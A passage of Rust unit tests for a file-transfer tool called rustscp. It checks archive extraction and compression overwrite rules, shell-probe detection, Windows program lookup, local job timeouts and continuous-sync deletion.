            command_error_message(CoreError::Timeout(
                "Remote command did not finish within 300 s".to_string()
            )),
            "Remote command did not finish within 300 s"
        );
        assert_eq!(
            command_error_message(CoreError::Timeout(String::new())),
            "The command did not finish in time and was stopped"
        );
        assert_eq!(
            command_error_message(CoreError::Protocol(
                "This SSH account does not allow shell commands".to_string()
            )),
            "This SSH account does not allow shell commands"
        );
        assert_eq!(
            command_error_message(CoreError::ConnectionFailed("reset".to_string())),
            "Connection failed: reset"
        );
    }

    #[cfg(unix)]
    fn run_sh(cmd: &str) -> std::process::Output {
        std::process::Command::new("/bin/sh")
            .arg("-c")
            .arg(cmd)
            .output()
            .unwrap()
    }

    #[cfg(unix)]
    #[test]
    fn tar_extraction_keeps_existing_files_unless_overwrite() {
        let dir = Scratch::new("tar-keep");
        std::fs::create_dir_all(dir.join("src")).unwrap();
        std::fs::write(dir.join("src/a.txt"), b"from archive").unwrap();
        std::fs::write(dir.join("src/b.txt"), b"new file").unwrap();
        let archive = dir.s("it's.tar.gz");
        let made = std::process::Command::new("tar")
            .arg("-czf")
            .arg(&archive)
            .arg("-C")
            .arg(dir.join("src"))
            .args(["a.txt", "b.txt"])
            .status()
            .unwrap();
        assert!(made.success());
        let out = dir.join("out dir");
        std::fs::create_dir_all(&out).unwrap();
        std::fs::write(out.join("a.txt"), b"mine").unwrap();
        let target = out.to_string_lossy().to_string();

        let keep = run_sh(&build_extract_command(
            &archive,
            &target,
            ArchiveKind::TarGz,
            false,
        ));
        assert!(
            keep.status.success(),
            "{}",
            String::from_utf8_lossy(&keep.stderr)
        );
        assert_eq!(std::fs::read(out.join("a.txt")).unwrap(), b"mine");
        assert_eq!(std::fs::read(out.join("b.txt")).unwrap(), b"new file");

        let replace = run_sh(&build_extract_command(
            &archive,
            &target,
            ArchiveKind::TarGz,
            true,
        ));
        assert!(
            replace.status.success(),
            "{}",
            String::from_utf8_lossy(&replace.stderr)
        );
        assert_eq!(std::fs::read(out.join("a.txt")).unwrap(), b"from archive");
    }

    #[cfg(unix)]
    #[test]
    fn zip_extraction_keeps_existing_files_unless_overwrite() {
        let have = |tool: &str| run_sh(&format!("command -v {tool}")).status.success();
        if !have("zip") || !have("unzip") {
            return;
        }
        let dir = Scratch::new("zip-keep");
        std::fs::create_dir_all(dir.join("src")).unwrap();
        std::fs::write(dir.join("src/a.txt"), b"from archive").unwrap();
        std::fs::write(dir.join("src/b.txt"), b"new file").unwrap();
        let archive = dir.s("a.zip");
        let made = std::process::Command::new("zip")
            .arg("-q")
            .arg(&archive)
            .args(["a.txt", "b.txt"])
            .current_dir(dir.join("src"))
            .status()
            .unwrap();
        assert!(made.success());
        let out = dir.join("out");
        std::fs::create_dir_all(&out).unwrap();
        std::fs::write(out.join("a.txt"), b"mine").unwrap();
        let target = out.to_string_lossy().to_string();

        let keep = run_sh(&build_extract_command(
            &archive,
            &target,
            ArchiveKind::Zip,
            false,
        ));
        assert!(
            keep.status.success(),
            "{}",
            String::from_utf8_lossy(&keep.stderr)
        );
        assert_eq!(std::fs::read(out.join("a.txt")).unwrap(), b"mine");
        assert_eq!(std::fs::read(out.join("b.txt")).unwrap(), b"new file");

        let replace = run_sh(&build_extract_command(
            &archive,
            &target,
            ArchiveKind::Zip,
            true,
        ));
        assert!(
            replace.status.success(),
            "{}",
            String::from_utf8_lossy(&replace.stderr)
        );
        assert_eq!(std::fs::read(out.join("a.txt")).unwrap(), b"from archive");

        // The python fallback (no unzip on the server) keeps existing files too.
        if have("python3") {
            std::fs::write(out.join("a.txt"), b"mine again").unwrap();
            std::fs::remove_file(out.join("b.txt")).unwrap();
            let py = std::process::Command::new("python3")
                .arg("-c")
                .arg(PY_UNZIP_KEEP_EXISTING)
                .arg(&archive)
                .arg(&target)
                .output()
                .unwrap();
            assert!(
                py.status.success(),
                "{}",
                String::from_utf8_lossy(&py.stderr)
            );
            assert_eq!(std::fs::read(out.join("a.txt")).unwrap(), b"mine again");
            assert_eq!(std::fs::read(out.join("b.txt")).unwrap(), b"new file");
        }
    }

    #[cfg(unix)]
    #[test]
    fn single_file_decompress_replaces_only_with_overwrite() {
        if !run_sh("command -v gzip").status.success() {
            return;
        }
        let dir = Scratch::new("gz-overwrite");
        std::fs::write(dir.join("dump.sql"), b"new contents\n").unwrap();
        assert!(std::process::Command::new("gzip")
            .arg(dir.join("dump.sql"))
            .status()
            .unwrap()
            .success());
        std::fs::create_dir_all(dir.join("out")).unwrap();
        std::fs::write(dir.join("out/dump.sql"), b"old").unwrap();
        let archive = dir.s("dump.sql.gz");
        let target = dir.s("out");

        let keep = run_sh(&build_single_decompress_command(
            &archive,
            &target,
            SingleFileCompression::Gzip,
            false,
        ));
        assert!(!keep.status.success());
        assert_eq!(std::fs::read(dir.join("out/dump.sql")).unwrap(), b"old");

        let replace = run_sh(&build_single_decompress_command(
            &archive,
            &target,
            SingleFileCompression::Gzip,
            true,
        ));
        assert!(
            replace.status.success(),
            "{}",
            String::from_utf8_lossy(&replace.stderr)
        );
        assert_eq!(
            std::fs::read(dir.join("out/dump.sql")).unwrap(),
            b"new contents\n"
        );
        assert!(!dir.join("out/dump.sql.rustscp-partial").exists());
    }

    /// Runs `cmd` with `/bin/sh -c` and `fake_bin` first on PATH (tool stand-ins).
    #[cfg(unix)]
    fn run_sh_with_path(cmd: &str, fake_bin: &std::path::Path) -> std::process::Output {
        let path = format!(
            "{}:{}",
            fake_bin.display(),
            std::env::var("PATH").unwrap_or_default()
        );
        std::process::Command::new("/bin/sh")
            .arg("-c")
            .arg(cmd)
            .env("PATH", path)
            .output()
            .unwrap()
    }

    #[cfg(unix)]
    fn write_script(path: &std::path::Path, body: &str) {
        use std::os::unix::fs::PermissionsExt;
        std::fs::write(path, body).unwrap();
        std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o755)).unwrap();
    }

    #[cfg(unix)]
    fn partial_files_in(dir: &std::path::Path) -> Vec<String> {
        std::fs::read_dir(dir)
            .unwrap()
            .filter_map(|e| e.ok())
            .map(|e| e.file_name().to_string_lossy().to_string())
            .filter(|n| n.starts_with(".rustscp-partial-"))
            .collect()
    }

    #[cfg(unix)]
    fn tar_listing(archive: &std::path::Path) -> String {
        let out = std::process::Command::new("tar")
            .arg("-tf")
            .arg(archive)
            .output()
            .unwrap();
        assert!(out.status.success(), "not a readable archive");
        String::from_utf8_lossy(&out.stdout).to_string()
    }

    #[cfg(unix)]
    #[test]
    fn compress_never_replaces_its_input_or_an_unconfirmed_archive() {
        let dir = Scratch::new("compress-keep");
        std::fs::create_dir_all(dir.join("project")).unwrap();
        std::fs::write(dir.join("project/ok.txt"), b"ok").unwrap();
        std::fs::write(dir.join("project.tar.gz"), b"yesterday").unwrap();
        let items = vec!["project".to_string()];
        let output = "project.tar.gz";

        // Without overwrite an existing archive is an error and stays untouched.
        let keep = run_sh(&build_compress_command(
            &dir.s(""),
            &items,
            ArchiveKind::TarGz,
            output,
            &partial_archive_name(output),
            false,
        ));
        assert!(!keep.status.success());
        assert!(String::from_utf8_lossy(&keep.stderr).contains(E_EXISTS));
        assert_eq!(std::fs::read(dir.join(output)).unwrap(), b"yesterday");
        assert!(partial_files_in(&dir.0).is_empty());

        // Confirmed: replaced by a complete archive, no partial file left behind.
        let replace = run_sh(&build_compress_command(
            &dir.s(""),
            &items,
            ArchiveKind::TarGz,
            output,
            &partial_archive_name(output),
            true,
        ));
        assert!(
            replace.status.success(),
            "{}",
            String::from_utf8_lossy(&replace.stderr)
        );
        assert!(tar_listing(&dir.join(output)).contains("project/ok.txt"));
        assert!(partial_files_in(&dir.0).is_empty());

        // A folder with the archive's name is never replaced.
        std::fs::create_dir_all(dir.join("taken.tar")).unwrap();
        let folder = run_sh(&build_compress_command(
            &dir.s(""),
            &items,
            ArchiveKind::Tar,
            "taken.tar",
            &partial_archive_name("taken.tar"),
            true,
        ));
        assert!(!folder.status.success());
        assert!(dir.join("taken.tar").is_dir());
        assert!(partial_files_in(&dir.0).is_empty());
    }

    #[cfg(unix)]
    #[test]
    fn compress_into_an_existing_zip_replaces_instead_of_merging() {
        if !run_sh("command -v zip && command -v unzip")
            .status
            .success()
        {
            return;
        }
        let dir = Scratch::new("compress-zip");
        std::fs::write(dir.join("stale.txt"), b"stale").unwrap();
        std::fs::write(dir.join("fresh.txt"), b"fresh").unwrap();
        let made = run_sh(&format!(
            "cd {} && zip -q a.zip stale.txt",
            sh_quote(&dir.s(""))
        ));
        assert!(made.status.success());
        let out = run_sh(&build_compress_command(
            &dir.s(""),
            &["fresh.txt".to_string()],
            ArchiveKind::Zip,
            "a.zip",
            &partial_archive_name("a.zip"),
            true,
        ));
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        let listing = std::process::Command::new("unzip")
            .arg("-l")
            .arg(dir.join("a.zip"))
            .output()
            .unwrap();
        let listing = String::from_utf8_lossy(&listing.stdout).to_string();
        assert!(listing.contains("fresh.txt"));
        assert!(
            !listing.contains("stale.txt"),
            "zip merged into the old archive"
        );
        assert!(partial_files_in(&dir.0).is_empty());
    }

    #[cfg(unix)]
    #[test]
    fn compression_pipelines_report_tar_and_compressor_failures() {
        let dir = Scratch::new("compress-pipe");
        let bin = dir.join("bin");
        std::fs::create_dir_all(&bin).unwrap();
        // Stand-ins so the pipe branches run everywhere: pigz -> gzip, xz -> gzip.
        write_script(&bin.join("pigz"), "#!/bin/sh\nexec gzip \"$@\"\n");
        write_script(&bin.join("xz"), "#!/bin/sh\nexec gzip \"$@\"\n");
        let work = dir.join("work");
        std::fs::create_dir_all(work.join("folder")).unwrap();
        std::fs::write(work.join("folder/ok.txt"), b"ok").unwrap();
        let items = vec!["folder".to_string()];
        let work_dir = work.to_string_lossy().to_string();

        for (kind, output) in [
            (ArchiveKind::TarGz, "f.tar.gz"),
            (ArchiveKind::TarXz, "f.tar.xz"),
        ] {
            let ok = run_sh_with_path(
                &build_compress_command(
                    &work_dir,
                    &items,
                    kind,
                    output,
                    &partial_archive_name(output),
                    true,
                ),
                &bin,
            );
            assert!(
                ok.status.success(),
                "{}",
                String::from_utf8_lossy(&ok.stderr)
            );
            assert!(work.join(output).is_file());
        }

        // The compressor fails: no archive, and the run is a failure.
        write_script(&bin.join("pigz"), "#!/bin/sh\ncat >/dev/null\nexit 1\n");
        let broken = run_sh_with_path(
            &build_compress_command(
                &work_dir,
                &items,
                ArchiveKind::TarGz,
                "g.tar.gz",
                &partial_archive_name("g.tar.gz"),
                true,
            ),
            &bin,
        );
        assert!(!broken.status.success());
        assert!(!work.join("g.tar.gz").exists());
        assert!(partial_files_in(&work).is_empty());

        // tar fails (an unreadable file) while the compressor succeeds.
        write_script(&bin.join("pigz"), "#!/bin/sh\nexec gzip \"$@\"\n");
        let probe = run_sh("id -u");
        if String::from_utf8_lossy(&probe.stdout).trim() == "0" {
            return; // root reads everything
        }
        let locked = work.join("folder/locked.txt");
        std::fs::write(&locked, b"secret").unwrap();
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&locked, std::fs::Permissions::from_mode(0o000)).unwrap();
        }
        for (kind, output) in [
            (ArchiveKind::TarGz, "h.tar.gz"),
            (ArchiveKind::TarXz, "h.tar.xz"),
        ] {
            let partial = run_sh_with_path(
                &build_compress_command(
                    &work_dir,
                    &items,
                    kind,
                    output,
                    &partial_archive_name(output),
                    true,
                ),
                &bin,
            );
            assert!(
                !partial.status.success(),
                "{output}: an incomplete archive was reported as a success"
            );
            assert!(!work.join(output).exists());
        }
        assert!(partial_files_in(&work).is_empty());
        {
            use std::os::unix::fs::PermissionsExt;
            let _ = std::fs::set_permissions(&locked, std::fs::Permissions::from_mode(0o600));
        }
    }

    #[cfg(unix)]
    #[test]
    fn keep_existing_extraction_without_tar_k_merges_through_a_temp_folder() {
        let dir = Scratch::new("tar-merge");
        std::fs::create_dir_all(dir.join("src/sub")).unwrap();
        std::fs::write(dir.join("src/a.txt"), b"new a").unwrap();
        std::fs::write(dir.join("src/b.txt"), b"new b").unwrap();
        std::fs::write(dir.join("src/sub/c.txt"), b"new c").unwrap();
        let archive = dir.s("it's.tar");
        let made = std::process::Command::new("tar")
            .arg("-cf")
            .arg(&archive)
            .arg("-C")
            .arg(dir.join("src"))
            .args(["a.txt", "b.txt", "sub"])
            .status()
            .unwrap();
        assert!(made.success());
        let out = dir.join("out");
        std::fs::create_dir_all(out.join("sub")).unwrap();
        std::fs::write(out.join("b.txt"), b"mine").unwrap();
        std::fs::write(out.join("sub/keep.txt"), b"keep").unwrap();

        // A tar that neither GNU tar nor bsdtar (busybox has no --version).
        let bin = dir.join("bin");
        std::fs::create_dir_all(&bin).unwrap();
        let real_tar = String::from_utf8_lossy(&run_sh("command -v tar").stdout)
            .trim()
            .to_string();
        write_script(
            &bin.join("tar"),
            &format!(
                "#!/bin/sh\nif [ \"$1\" = --version ]; then exit 1; fi\nexec {} \"$@\"\n",
                sh_quote(&real_tar)
            ),
        );
        let keep = run_sh_with_path(
            &build_extract_command(&archive, &out.to_string_lossy(), ArchiveKind::Tar, false),
            &bin,
        );
        assert!(
            keep.status.success(),
            "{}",
            String::from_utf8_lossy(&keep.stderr)
        );
        assert_eq!(std::fs::read(out.join("a.txt")).unwrap(), b"new a");
        assert_eq!(std::fs::read(out.join("b.txt")).unwrap(), b"mine");
        assert_eq!(std::fs::read(out.join("sub/c.txt")).unwrap(), b"new c");
        assert_eq!(std::fs::read(out.join("sub/keep.txt")).unwrap(), b"keep");
        let leftovers: Vec<_> = std::fs::read_dir(&out)
            .unwrap()
            .filter_map(|e| e.ok())
            .filter(|e| {
                e.file_name()
                    .to_string_lossy()
                    .starts_with(".rustscp-extract")
            })
            .collect();
        assert!(leftovers.is_empty(), "temp folder left behind");
    }

    #[test]
    fn the_same_server_is_one_file_tree() {
        let sftp = |host: &str, port: u16, user: &str| ConnectionConfig {
            id: "x".to_string(),
            name: "x".to_string(),
            protocol: Protocol::Sftp,
            host: host.to_string(),
            port,
            username: user.to_string(),
            auth: rustscp_core::AuthMethod::None,
            remote_root: "/".to_string(),
        };
        let a = sftp("Example.com", 22, "deploy");
        assert!(same_file_tree(&a, &sftp(" example.com ", 0, "deploy")));
        assert!(same_file_tree(&a, &sftp("example.com", 22, "other")));
        assert!(!same_file_tree(&a, &sftp("example.org", 22, "deploy")));
        assert!(!same_file_tree(&a, &sftp("example.com", 2222, "deploy")));
        let mut ftp = sftp("example.com", 0, "deploy");
        ftp.protocol = Protocol::Ftp;
        assert!(!same_file_tree(&a, &ftp));
        assert!(same_file_tree(
            &ConnectionConfig::local(),
            &ConnectionConfig::local()
        ));
        let mut s3 = sftp("s3.eu-west-1.amazonaws.com", 0, "key");
        s3.protocol = Protocol::S3;
        s3.remote_root = "/bucket/".to_string();
        let mut s3_other = s3.clone();
        assert!(same_file_tree(&s3, &s3_other));
        s3_other.remote_root = "other".to_string();
        assert!(!same_file_tree(&s3, &s3_other));

        assert!(same_tree_transfer_rejection("/srv/report.bin", "/srv/./report.bin").is_some());
        assert!(same_tree_transfer_rejection("/srv/site", "/srv/site/copy/site").is_some());
        assert!(same_tree_transfer_rejection("/srv/site", "/srv/site-2/site").is_none());
        assert!(same_tree_transfer_rejection("/srv/a.txt", "/home/a.txt").is_none());
    }

    #[test]
    fn only_posix_shells_pass_the_shell_probe() {
        assert!(posix_shell_probe_passed("RUSTSCP_SHELL_'OK&\\\n"));
        assert!(posix_shell_probe_passed("motd\r\nRUSTSCP_SHELL_'OK&\\\r\n"));
        // fish / cmd.exe style results.
        assert!(!posix_shell_probe_passed("RUSTSCP_SHELL_OK\n"));
        assert!(!posix_shell_probe_passed("RUSTSCP_SHELL_'OK\n"));
        assert!(!posix_shell_probe_passed("RUSTSCP_SHELL_''OK&\\\n"));
        assert!(!posix_shell_probe_passed(""));
        #[cfg(unix)]
        for shell in ["/bin/sh", "/bin/bash", "/bin/dash", "/bin/zsh"] {
            if !std::path::Path::new(shell).exists() {
                continue;
            }
            let out = std::process::Command::new(shell)
                .arg("-c")
                .arg(POSIX_SHELL_PROBE)
                .output()
                .unwrap();
            assert!(
                posix_shell_probe_passed(&String::from_utf8_lossy(&out.stdout)),
                "{shell} did not pass the probe"
            );
        }
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn local_sessions_always_have_a_posix_shell() {
        assert!(posix_shell_available(&local_vfs()).await);
    }

    #[test]
    fn windows_editor_lookup_uses_pathext() {
        let dir = Scratch::new("pathext");
        std::fs::write(dir.join("code.cmd"), b"@echo off").unwrap();
        std::fs::write(dir.join("evil.js"), b"WScript.Echo(1)").unwrap();
        let path_var = std::env::join_paths([std::path::PathBuf::from("."), dir.join("")]).unwrap();
        assert_eq!(
            find_windows_program("code", Some(&path_var), Some(".COM;.EXE;.BAT;.CMD")),
            Some(dir.join("code.cmd"))
        );
        // Only extensions a process can start from: never .js / .vbs.
        assert_eq!(
            find_windows_program("evil", Some(&path_var), Some(".JS;.VBS")),
            None
        );
        assert_eq!(
            find_windows_program("code", Some(&path_var), Some(".JS")),
            Some(dir.join("code.cmd"))
        );
        // Names with a folder or an extension are left to Command itself.
        assert_eq!(
            find_windows_program("code.cmd", Some(&path_var), None),
            None
        );
        assert_eq!(
            find_windows_program("C:\\x\\code", Some(&path_var), None),
            None
        );
        assert_eq!(find_windows_program("code", None, None), None);
    }

    #[test]
    fn only_text_files_fall_back_to_xdg_open() {
        assert!(is_editable_text_mime("text/plain"));
        assert!(is_editable_text_mime("text/x-csrc\n"));
        assert!(!is_editable_text_mime("text/html"));
        assert!(!is_editable_text_mime("application/x-ms-dos-executable"));
        assert!(!is_editable_text_mime("application/x-java-archive"));
        assert!(!is_editable_text_mime("application/x-desktop"));
        assert!(!is_editable_text_mime(""));
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn long_local_jobs_report_output_and_kill_the_whole_group_on_timeout() {
        let (code, stdout, stderr) = run_local_shell_long(
            "echo out; echo err >&2; exit 3",
            std::time::Duration::from_secs(30),
        )
        .await
        .unwrap();
        assert_eq!(
            (code, stdout.as_str(), stderr.as_str()),
            (3, "out\n", "err\n")
        );

        let dir = Scratch::new("long-job");
        let marker = dir.join("still-running");
        let cmd = format!(
            "( sleep 2; touch {} ) & sleep 30",
            sh_quote(&marker.to_string_lossy())
        );
        let started = std::time::Instant::now();
        let err = run_local_shell_long(&cmd, std::time::Duration::from_millis(500))
            .await
            .unwrap_err();
        assert!(err.contains("did not finish"), "{err}");
        assert!(started.elapsed() < std::time::Duration::from_secs(10));
        tokio::time::sleep(std::time::Duration::from_secs(3)).await;
        assert!(
            !marker.exists(),
            "a background process of the job kept running"
        );
    }

    #[cfg(target_os = "macos")]
    #[test]
    fn an_ejected_mount_folder_is_not_reported_as_mounted() {
        let dir = Scratch::new("mount-probe");
        let folder = dir.join("My Server-1a2b3c4d");
        std::fs::create_dir_all(&folder).unwrap();
        // A plain folder (what Finder leaves behind after an eject) is not a mount.
        assert!(!os_mount_present(&folder.to_string_lossy(), 0));
        // A folder that was removed is not a mount either.
        assert!(!os_mount_present(&dir.s("gone"), 0));
        // /dev is a separate file system (devfs).
        assert!(os_mount_present("/dev", 0));
    }

    #[tokio::test]
    async fn continuous_sync_propagates_removals_only_when_enabled() {
        let local = Scratch::new("sync-local");
        let remote = Scratch::new("sync-remote");
        std::fs::create_dir_all(remote.join("folder/inner")).unwrap();
        std::fs::write(remote.join("folder/inner/x.txt"), b"x").unwrap();
        std::fs::write(remote.join("file.txt"), b"f").unwrap();
        let vfs = local_vfs();
        let root = remote.0.to_string_lossy().to_string();
        let removal = |rel: &str| rustscp_core::WatchEvent {
            path: local.join(rel),
            relative_path: rel.to_string(),
            is_dir: false,
            kind: rustscp_core::continuous_sync::WatchEventKind::Removed,
        };

        // Without the flag nothing is deleted on the remote side.
        apply_continuous_sync_event(&vfs, &removal("file.txt"), &root, false)
            .await
            .unwrap();
        assert!(remote.join("file.txt").exists());

        apply_continuous_sync_event(&vfs, &removal("file.txt"), &root, true)
            .await
            .unwrap();
        assert!(!remote.join("file.txt").exists());
        apply_continuous_sync_event(&vfs, &removal("folder"), &root, true)
            .await
            .unwrap();
        assert!(!remote.join("folder").exists());
        // A path that is already gone is not an error.
        apply_continuous_sync_event(&vfs, &removal("never-existed.txt"), &root, true)
            .await
            .unwrap();
    }
}
